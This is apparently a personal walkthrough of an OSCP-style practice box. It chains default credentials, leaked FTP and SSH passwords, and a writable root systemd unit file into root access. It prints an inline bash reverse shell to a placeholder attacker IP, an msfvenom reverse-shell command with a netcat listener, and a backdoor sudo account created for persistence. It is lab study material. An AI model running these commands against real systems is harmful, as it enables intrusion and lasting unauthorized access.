
## Overview

**Platform:** OSCP-style practice box **Operating System:** Linux (Ubuntu 24.04) **Web Application:** Custom "Spider Society" control panel (PHP) **Initial Access:** Default admin creds on a hidden login panel → app-level endpoint leaks FTP credentials → dotfile on the web server directly exposes DB/SSH credentials → SSH login **Initial Access Type:** Web application misconfiguration + credential leakage chain **Privilege Escalation:** Writable systemd unit file for a root-run service, restartable via a scoped sudo rule **Final Access:** Root

### Key Techniques

- Nmap service enumeration
- gobuster directory brute-forcing
- Redirect-following to find a hidden admin panel
- Default credential login
- Client-side JS review to find an undocumented backend endpoint
- Direct browser navigation to a "hidden" dotfile (permissions misconfiguration)
- FTP enumeration (non-anonymous, credentialed)
- Webshell upload via FTP (reference method — not needed in this run)
- Reverse shell via named pipe (`mkfifo`) one-liner
- systemd unit file / service enumeration
- Writable service file + restart-scoped sudo rule abuse
- msfvenom-generated reverse shell payload as an alternative privesc trigger
- Backdoor user creation for persistence

---

# Attack Path

```text
Nmap: 22, 80, 2121
        ↓
gobuster Finds /libspider (Redirects to Login Page)
        ↓
Default Creds (admin:admin) on Spider Society Control Panel
        ↓
Client-Side JS Reveals fetch-credentials.php Endpoint
        ↓
Endpoint Leaks FTP Credentials
        ↓
FTP Login (Port 2121) — Read-Only, No Upload Capability
        ↓
Hidden Dotfile Spotted in Directory Listing (No FTP Read Perms)
        ↓
Same Dotfile Directly Browsable Over HTTP
        ↓
Dotfile Leaks DB_CONNECT_USER / DB_CONNECT_PASS
        ↓
Credentials Reused for SSH Login (spidey)
        ↓
Shell as spidey — Local Flag Retrieved
        ↓
systemctl Enumeration: spiderbackup.service (runs as root)
        ↓
Service Unit File Writable by spidey
        ↓
sudo -l: spidey May Restart spiderbackup.service (NOPASSWD)
        ↓
Replace ExecStart With msfvenom Payload Execution
        ↓
sudo systemctl daemon-reload && restart
        ↓
Root Shell via msfvenom Payload Callback
        ↓
Backdoor User Created + Added to sudo Group (Persistence)
```

---

# 1. Nmap Enumeration

```bash
nmap <target>
nmap <target> -sV -sC
```

```text
22/tcp    ssh    OpenSSH 9.6p1 Ubuntu
80/tcp    http   Apache 2.4.58 - "Spider Society"
2121/tcp  ftp    vsftpd 3.0.5
```

FTP on a non-standard port (`2121` rather than `21`) is worth noting — often done to dodge naive port-based assumptions or basic scanning, but doesn't change how it's enumerated.

---

# 2. Web Enumeration

Landing page is a static site with a login button leading to a `404`.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target>/
```

```text
/images       301
/libspider    301
/server-status  403
```

`/libspider` redirects to a genuine login page — **"Spider Society Control Panel"** — distinct from the static front-end site's dead login button.

> [!tip] Recognition Pattern A visible, non-functional login link on the main site (leading to a 404) shouldn't be assumed to be the _only_ login mechanism. Directory brute-forcing found a completely separate, functioning admin panel under an unrelated path — always keep enumerating even after finding one "login" that turns out to be a dead end.

---

# 3. Exploitation — Default Creds → Endpoint Leak → Dotfile Leak

## Default credentials

The `/libspider/` control panel accepts:

```text
admin:admin
```

## Client-side review reveals a hidden endpoint

Inspecting the control panel's page source shows a "Communications" button that calls `fetch-credentials.php` directly. Requesting that endpoint directly (no additional auth needed beyond the session) returns:

```json
{
  "FTP_BACKUP_USER": "ss_ftpbckuser",
  "FTP_BACKUP_PASS": "ss_WeLoveSpiderSociety_From_Tech_Dept5937!"
}
```

> [!tip] Recognition Pattern Always read the client-side JavaScript of any authenticated panel — buttons wired to specific endpoints (`fetch-credentials.php` here) often reveal backend routes that aren't otherwise discoverable through directory brute-forcing, and may not enforce the same access checks as the page that links to them.

## FTP enumeration

```bash
ftp <target> 2121
# Username: ss_ftpbckuser
# Password: ss_WeLoveSpiderSociety_From_Tech_Dept5937!
```

```text
ftp> ls
404.html
images/
index.html
libspider/
simple.py
```

Inside `libspider/`, a hidden dotfile with restrictive permissions stands out:

```text
-r-------- 1 33 33 168 Mar 29 12:42 .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
```

Owned by `www-data` (UID 33) — the FTP account can see it in the listing but **cannot read or retrieve it** (`550 Failed to open file`), and cannot `chmod` it either.

## What I did differently

## Bypassing the FTP read restriction

Rather than trying to gain FTP upload/write access (the reference walkthrough's path — uploading a PHP webshell via FTP to get code execution, then reading the dotfile locally as `www-data`), I noticed the dotfile lives inside the **web-served directory** (`libspider/`). Since Apache generally doesn't distinguish "hidden" (dotfile) files from any other file it's configured to serve, I simply **requested the same file directly over HTTP** in the browser:

```text
http://<target>/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
```

This returned the file contents directly — the FTP-level permission restriction (`-r--------`, owner-only) had no bearing on Apache's own file-serving permissions, since Apache runs as `www-data`, the file's actual owner.

```text
FTP_BACKUP_USER=ss_ftpbckuser
FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!

DB_CONNECT_USER=spidey
DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
```

> [!warning] "Hidden" Isn't a Permission A leading dot on a filename hides it from a normal `ls`, but it's not an access control — it's a naming convention. If a dotfile sits inside a directory the web server actively serves, and the web server process owns/can-read the file, requesting it directly by name over HTTP works regardless of what FTP-level Unix permissions say. Never assume a file is inaccessible just because one protocol/interface can't retrieve it — try others (HTTP, a different service account, direct filesystem access once you have any shell) before concluding it's a dead end.

> [!note] Reference Walkthrough's Approach (Not Needed Here) The original walkthrough found the FTP account _did_ have upload permissions, and used that to place a webshell (`webshell.php`) via `put`, then triggered it over HTTP with a `mkfifo`-based reverse shell one-liner to land as `www-data`, from which the dotfile became readable locally (`www-data` owns it). **In my run, the FTP account had no upload capability at all** — this HTTP-direct-request approach was the working path instead, and skipped needing a shell as `www-data` altogether before getting the second credential set.

## Direct SSH login

The dotfile's `DB_CONNECT_USER`/`DB_CONNECT_PASS` values turned out to work directly for SSH, without needing any foothold shell first:

```bash
ssh spidey@<target>
# Password: WithGreatPowerComesGreatSecurity99!
```

```bash
id
cat /home/spidey/local.txt
```

> [!tip] Key Principle Never assume leaked credentials are scoped only to the service they were labeled for — a variable named `DB_CONNECT_PASS` turning out to also be the user's actual login password is a very common instance of password reuse across "the database" and "the human," worth trying against SSH immediately regardless of what the credential's label implies.

---

# 4. Privilege Escalation Enumeration

```bash
systemctl list-units --type=service --all | grep spider
```

```text
spiderbackup.service   loaded  inactive  dead  Spider Society Backup Service
```

```bash
systemctl cat spiderbackup.service
```

```ini
[Service]
Type=simple
ExecStart=/usr/local/bin/spiderbackup.sh
User=root
Group=root
```

Runs as **root**.

## Checking file permissions

```bash
ls -l /usr/local/bin/spiderbackup.sh
# -rwxr-xr-x 1 root root ...   (not writable by spidey)

ls -l /etc/systemd/system/spiderbackup.service
# -rw-rw-r-- 1 spidey spidey ...   (writable by spidey!)
```

The **script itself** is locked down, but the **unit file that defines how it's launched** is group/owner-writable by `spidey`.

## Confirming the restart capability

```bash
sudo -l | grep spider
```

```text
(ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
```

`spidey` can restart this specific service as root, no password — combined with write access to the unit file, this is a complete privesc primitive: change what the service does, then trigger it via the permitted restart command.

> [!tip] Recognition Pattern A systemd service running as root is only as locked-down as its **weakest writable component** — that's not always the executed script itself. Always check permissions on the `.service` unit file separately from the script/binary it points to; a writable unit file lets you redefine `ExecStart` entirely, bypassing whatever protections exist on the original script.

---

# 5. Privilege Escalation — Malicious Unit File

## Reference approach: inline bash reverse shell

```ini
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<attacker_ip>/6969 0>&1"
```

## What I did differently: msfvenom-generated payload

Rather than an inline bash TCP redirection one-liner, generated a standalone reverse-shell payload with **msfvenom** and pointed `ExecStart` at executing it directly:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=6969 -f elf -o spiderbackup_payload
```

Delivered the payload to the target (e.g. via the existing SSH access as `spidey`, `scp`, or a quick HTTP transfer), made it executable, then edited the unit file's `ExecStart` to point at it:

```ini
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/spiderbackup_payload
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl restart spiderbackup.service
```

```bash
nc -lnvp 6969
```

Root shell received via the msfvenom payload's callback.

```bash
id
# uid=0(root)
cat /root/proof.txt
```

> [!tip] Inline One-Liner vs. Compiled Payload Both approaches exploit the exact same writable-unit-file weakness — the difference is just delivery mechanism:
> 
> - **Inline bash one-liner in `ExecStart`** — no separate file needed, payload lives entirely in the unit file text, fastest to set up.
> - **msfvenom-generated binary referenced by `ExecStart`** — requires staging a file on the target first, but produces a more full-featured payload (can be swapped for a Meterpreter stager, encoded payload, etc. if that's useful for the engagement), and keeps the unit file itself looking comparatively unremarkable.
> 
> Worth having both in mind: the one-liner is faster when you just need root once; a staged payload is more flexible if you want a richer callback (Meterpreter session, particular encoding to dodge detection, etc.).

---

# 6. Post-Exploitation — Persistence

```bash
sudo useradd -m -s /bin/bash xeno
sudo passwd xeno
sudo usermod -aG sudo xeno
```

Creates a durable backdoor account with full sudo rights, independent of the original exploit chain — useful for maintaining access without needing to re-run the whole attack path if the original foothold gets patched or the box is reset mid-engagement.

```bash
su xeno
sudo -s
id
# uid=0(root)
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|A visible login link 404s|Keep enumerating — a separate, working login panel is often elsewhere|
|Authenticated panel has JS-wired buttons|Read the client-side JS for backend endpoints it calls directly|
|FTP shows a file you can't read/retrieve|Check if the same file sits in a web-served directory — try HTTP instead|
|A credential is labeled for one purpose (DB, FTP, etc.)|Try it everywhere anyway — SSH, other services — password reuse is common|
|A systemd service runs as root|Check permissions on the `.service` unit file itself, not just the script it launches|
|`sudo -l` permits restarting a specific service|Combined with a writable unit file, this is a full root-as-a-service primitive|
|Need a privesc payload beyond a basic reverse shell|msfvenom-generated binaries are a flexible alternative to inline one-liners, at the cost of needing file delivery first|

---

# Key Lessons

> [!tip] "Hidden" Files Aren't Access-Controlled A leading dot hides a file from casual listing, not from any protocol that can otherwise reach it. If one interface (FTP here) can't retrieve a file due to Unix permissions, try another that might serve it under different rules (HTTP, direct filesystem access via a different shell/user).

> [!tip] Credentials Aren't Scoped to Their Label A variable named for one service (`DB_CONNECT_PASS`) may work for a completely different login (SSH). Always test leaked credentials broadly, not just against the service the variable name implies.

> [!tip] A Root-Run systemd Service Is Only as Safe as Its Unit File Check write permissions on `.service` files independently from the scripts/binaries they invoke — a writable unit file with a permitted restart command is a complete privesc chain on its own, regardless of how locked-down the underlying script is.

> [!tip] Multiple Valid Payload Delivery Mechanisms for the Same Privesc Once you can redefine what a root-run service executes, the payload itself can be an inline one-liner or a staged compiled binary (msfvenom, etc.) — pick based on whether speed or payload flexibility matters more for the engagement.